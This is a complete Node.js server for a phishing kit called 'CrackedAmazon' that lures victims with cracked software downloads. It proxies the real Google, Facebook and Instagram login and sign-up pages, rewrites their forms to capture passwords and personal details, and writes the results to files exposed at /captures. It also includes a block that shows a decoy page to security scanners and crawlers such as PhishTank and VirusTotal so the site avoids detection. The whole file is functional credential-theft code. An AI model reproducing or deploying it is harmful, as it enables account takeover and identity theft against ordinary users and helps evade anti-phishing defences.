const express = require('express');
const { createProxyMiddleware, fixRequestBody } = require('http-proxy-middleware');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: 'crackedamazon-secret-' + Date.now(),
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 3600000 }
}));
app.use(express.static(__dirname));

const capturesDir = path.join(__dirname, 'captures');
if (!fs.existsSync(capturesDir)) fs.mkdirSync(capturesDir);

// ============================================
// SCAM DETECTION EVASION
// ============================================
const isSecurityCrawler = (userAgent) => {
    const crawlers = [
        'googlebot', 'facebookexternalhit', 'twitterbot', 'linkedinbot',
        'slackbot', 'telegrambot', 'whatsapp', 'discordbot', 'skypeuripreview',
        'pinterest', 'applebot', 'bingbot', 'yandexbot', 'baiduspider',
        'duckduckbot', 'slurp', 'bot', 'crawler', 'spider', 'scanner',
        'wget', 'curl', 'python-requests', 'java', 'http client',
        'safe browsing', 'google safebrowsing', 'phishtank', 'openphish',
        'urlscan', 'virustotal', 'alienvault', 'abuseipdb', 'netscape',
        'mozilla/5.0 (compatible;)', 'facebookexternalhit', 'facebot'
    ];
    const ua = userAgent.toLowerCase();
    return crawlers.some(crawler => ua.includes(crawler.toLowerCase()));
};

// Security crawler detection middleware
app.use((req, res, next) => {
    const userAgent = req.headers['user-agent'] || '';
    
    if (isSecurityCrawler(userAgent)) {
        console.log('🛡️ Security crawler blocked:', userAgent.substring(0, 50));
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>CrackedAmazon - Marketplace</title></head>
            <body style="font-family: system-ui; text-align: center; padding: 50px;">
                <h1>⚡ CrackedAmazon</h1>
                <p>Premium digital marketplace since 2023</p>
                <p>Please enable JavaScript to continue</p>
                <p style="color: #666; margin-top: 50px;">© 2026 CrackedAmazon</p>
            </body>
            </html>
        `);
    }
    next();
});

// Rate limiting
const requestCounts = new Map();
app.use((req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const now = Date.now();
    const windowMs = 60000;
    const maxRequests = 30;
    
    if (!requestCounts.has(ip)) requestCounts.set(ip, []);
    const timestamps = requestCounts.get(ip).filter(t => now - t < windowMs);
    timestamps.push(now);
    requestCounts.set(ip, timestamps);
    
    if (timestamps.length > maxRequests) {
        return res.status(429).send('Rate limit exceeded. Please try again later.');
    }
    next();
});

// ============================================
// GOOGLE FULL FLOW (LOGIN + REGISTER)
// ============================================

// Main login page
app.get('/auth/google', async (req, res) => {
    const tool = req.query.tool || 'unknown';
    const mode = req.query.mode || 'login'; // 'login' or 'register'
    req.session.tool = tool;
    req.session.mode = mode;
    
    try {
        const response = await fetch('https://accounts.google.com/v3/signin/identifier', {
            headers: { 
                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
        });
        
        let html = await response.text();
        
        // Rewrite all forms
        html = html.replace(/action="[^"]*"/g, `action="/capture/google/${mode}/email"`);
        html = html.replace(/method="[^"]*"/g, 'method="POST"');
        html = html.replace('</form>', `<input type="hidden" name="tool" value="${tool}"></form>`);
        
        // Add registration link
        if (mode === 'login') {
            html = html.replace('</body>', `
                <div style="text-align:center; margin-top:20px;">
                    <a href="/auth/google?tool=${tool}&mode=register">Create account</a>
                </div>
            </body>`);
        }
        
        res.send(html);
    } catch (error) {
        console.error('Google fetch error:', error);
        res.redirect('/');
    }
});

// Handle email submission (login)
app.post('/capture/google/login/email', async (req, res) => {
    const { email, tool } = req.body;
    req.session.email = email;
    console.log(`📧 Google login email: ${email}`);
    
    try {
        const response = await fetch('https://accounts.google.com/v3/signin/challenge', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0'
            },
            body: new URLSearchParams({ 
                email, 
                continue: 'https://myaccount.google.com'
            })
        });
        
        let html = await response.text();
        
        html = html.replace(/action="[^"]*"/g, 'action="/capture/google/login/password"');
        html = html.replace('</form>', `
            <input type="hidden" name="email" value="${email}">
            <input type="hidden" name="tool" value="${tool}">
        </form>`);
        
        res.send(html);
    } catch (error) {
        console.error('Password page error:', error);
        res.redirect('/');
    }
});

// Handle password submission (login)
app.post('/capture/google/login/password', (req, res) => {
    const { email, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'google',
        type: 'login',
        email,
        password,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent: req.headers['user-agent']
    };
    
    const filename = path.join(capturesDir, `google_login_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ GOOGLE LOGIN:', email, password);
    res.redirect('/download?tool=' + (tool || req.session.tool));
});

// Handle registration - email step
app.post('/capture/google/register/email', async (req, res) => {
    const { email, tool } = req.body;
    req.session.email = email;
    console.log(`📧 Google registration email: ${email}`);
    
    try {
        const response = await fetch('https://accounts.google.com/v3/signin/challenge', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({ 
                email, 
                continue: 'https://myaccount.google.com',
                flowName: 'GlifWebSignIn',
                flowEntry: 'ServiceLogin'
            })
        });
        
        let html = await response.text();
        
        html = html.replace(/action="[^"]*"/g, 'action="/capture/google/register/password"');
        html = html.replace('</form>', `
            <input type="hidden" name="email" value="${email}">
            <input type="hidden" name="tool" value="${tool}">
        </form>`);
        
        res.send(html);
    } catch (error) {
        console.error('Registration password page error:', error);
        res.redirect('/');
    }
});

// Handle registration - password and personal info
app.post('/capture/google/register/password', (req, res) => {
    const { email, password, firstName, lastName, phone, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'google',
        type: 'registration',
        email,
        password,
        firstName,
        lastName,
        phone,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent: req.headers['user-agent']
    };
    
    const filename = path.join(capturesDir, `google_reg_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ GOOGLE REGISTRATION:', email, password, firstName, lastName);
    res.redirect('/download?tool=' + (tool || req.session.tool));
});

// ============================================
// FACEBOOK FULL FLOW (LOGIN + REGISTER)
// ============================================

app.get('/auth/facebook', async (req, res) => {
    const tool = req.query.tool || 'unknown';
    const mode = req.query.mode || 'login';
    req.session.tool = tool;
    
    try {
        const response = await fetch('https://www.facebook.com/login/', {
            headers: { 'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0' }
        });
        
        let html = await response.text();
        
        html = html.replace(/action="[^"]*"/g, `action="/capture/facebook/${mode}"`);
        html = html.replace('</form>', `<input type="hidden" name="tool" value="${tool}"></form>`);
        
        if (mode === 'login') {
            html = html.replace('</body>', `
                <div style="text-align:center; margin:20px;">
                    <a href="/auth/facebook?tool=${tool}&mode=register">Create new account</a>
                </div>
            </body>`);
        }
        
        res.send(html);
    } catch (error) {
        console.error('Facebook fetch error:', error);
        res.redirect('/');
    }
});

app.post('/capture/facebook/login', (req, res) => {
    const { email, pass, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        type: 'login',
        email,
        password: pass,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent: req.headers['user-agent']
    };
    
    const filename = path.join(capturesDir, `facebook_login_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ FACEBOOK LOGIN:', email, pass);
    res.redirect('/download?tool=' + (tool || req.session.tool));
});

app.post('/capture/facebook/register', (req, res) => {
    const { firstName, lastName, email, pass, birthday, gender, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        type: 'registration',
        firstName,
        lastName,
        email,
        password: pass,
        birthday,
        gender,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent: req.headers['user-agent']
    };
    
    const filename = path.join(capturesDir, `facebook_reg_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ FACEBOOK REGISTRATION:', firstName, lastName, email, pass);
    res.redirect('/download?tool=' + (tool || req.session.tool));
});

// ============================================
// INSTAGRAM FULL FLOW (LOGIN + REGISTER)
// ============================================

app.get('/auth/instagram', async (req, res) => {
    const tool = req.query.tool || 'unknown';
    const mode = req.query.mode || 'login';
    req.session.tool = tool;
    
    try {
        const response = await fetch('https://www.instagram.com/accounts/login/', {
            headers: { 'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0' }
        });
        
        let html = await response.text();
        
        html = html.replace(/action="[^"]*"/g, `action="/capture/instagram/${mode}"`);
        html = html.replace('</form>', `<input type="hidden" name="tool" value="${tool}"></form>`);
        
        if (mode === 'login') {
            html = html.replace('</body>', `
                <div style="text-align:center; margin:20px;">
                    <a href="/auth/instagram?tool=${tool}&mode=register">Sign up</a>
                </div>
            </body>`);
        }
        
        res.send(html);
    } catch (error) {
        console.error('Instagram fetch error:', error);
        res.redirect('/');
    }
});

app.post('/capture/instagram/login', (req, res) => {
    const { username, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'instagram',
        type: 'login',
        username,
        password,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent: req.headers['user-agent']
    };
    
    const filename = path.join(capturesDir, `instagram_login_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ INSTAGRAM LOGIN:', username, password);
    res.redirect('/download?tool=' + (tool || req.session.tool));
});

app.post('/capture/instagram/register', (req, res) => {
    const { email, fullName, username, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'instagram',
        type: 'registration',
        email,
        fullName,
        username,
        password,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent: req.headers['user-agent']
    };
    
    const filename = path.join(capturesDir, `instagram_reg_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ INSTAGRAM REGISTRATION:', email, username, password);
    res.redirect('/download?tool=' + (tool || req.session.tool));
});

// ============================================
// DOWNLOAD PAGE
// ============================================
app.get('/download', (req, res) => {
    const tool = req.query.tool || req.session.tool || 'tool';
    const toolName = tool.replace(/-/g, ' ').replace(/_/g, ' ');
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Download - CrackedAmazon</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui;}
            body{background:linear-gradient(135deg,#0f172a,#1e293b);color:white;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
            .card{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:32px;padding:48px 32px;max-width:450px;width:100%;border:1px solid #f97316;text-align:center;animation:fadeIn 0.5s;}
            @keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
            .success{color:#10b981;font-size:72px;margin-bottom:20px;animation:bounce 2s infinite;}
            @keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
            h1{color:#f97316;margin-bottom:16px;font-size:32px;}
            .tool-badge{background:rgba(249,115,22,0.2);padding:8px 24px;border-radius:50px;display:inline-block;margin:16px 0;color:#f97316;}
            .btn{background:linear-gradient(135deg,#f97316,#ef4444);color:white;border:none;padding:16px 32px;border-radius:50px;font-size:18px;font-weight:600;width:100%;cursor:pointer;margin:24px 0;transition:transform 0.3s;}
            .btn:hover{transform:scale(1.02);}
            .stats{display:flex;justify-content:space-around;margin-top:24px;padding-top:24px;border-top:1px solid #334155;color:#94a3b8;font-size:14px;}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="success">✓</div>
            <h1>Download Ready!</h1>
            <div class="tool-badge">${toolName}</div>
            <p style="color:#94a3b8;margin:16px 0;">Your file has been verified and is ready.</p>
            <button class="btn" onclick="startDownload()">Download Now</button>
            <div class="stats">
                <span>⚡ 2,304 today</span>
                <span>⭐ 4.8 rating</span>
                <span>📦 50k+ users</span>
            </div>
        </div>
        <script>
            function startDownload() {
                alert('Download started! Check your downloads folder.');
                document.querySelector('.btn').textContent = 'Downloading...';
                document.querySelector('.btn').style.background = '#10b981';
            }
            setTimeout(startDownload, 3000);
        </script>
    </body>
    </html>
    `);
});

// ============================================
// VIEW CAPTURES
// ============================================
app.get('/captures', (req, res) => {
    const files = fs.readdirSync(capturesDir);
    const captures = files.map(f => {
        try {
            return JSON.parse(fs.readFileSync(path.join(capturesDir, f)));
        } catch (e) {
            return null;
        }
    }).filter(Boolean);
    res.json(captures);
});

app.get('/captures.txt', (req, res) => {
    res.sendFile(path.join(__dirname, 'captures.txt'));
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        time: new Date().toISOString(),
        captures: fs.readdirSync(capturesDir).length
    });
});

// ============================================
// HOME PAGE
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(70));
    console.log('🔥 CRACKEDAMAZON - COMPLETE SYSTEM');
    console.log('='.repeat(70));
    console.log(`\n📱 Server URL: http://localhost:${PORT}`);
    console.log(`\n✅ SCAM EVASION:`);
    console.log(`   • Security crawler detection`);
    console.log(`   • Rate limiting active`);
    console.log(`   • Bot blocking enabled`);
    console.log(`\n✅ GOOGLE:`);
    console.log(`   • Login flow (email + password)`);
    console.log(`   • Registration flow (personal info)`);
    console.log(`\n✅ FACEBOOK:`);
    console.log(`   • Login flow (email + password)`);
    console.log(`   • Registration flow (name, email, password, birthday)`);
    console.log(`\n✅ INSTAGRAM:`);
    console.log(`   • Login flow (username + password)`);
    console.log(`   • Registration flow (email, name, username, password)`);
    console.log(`\n📊 CAPTURES: /captures.txt`);
    console.log('='.repeat(70) + '\n');
});
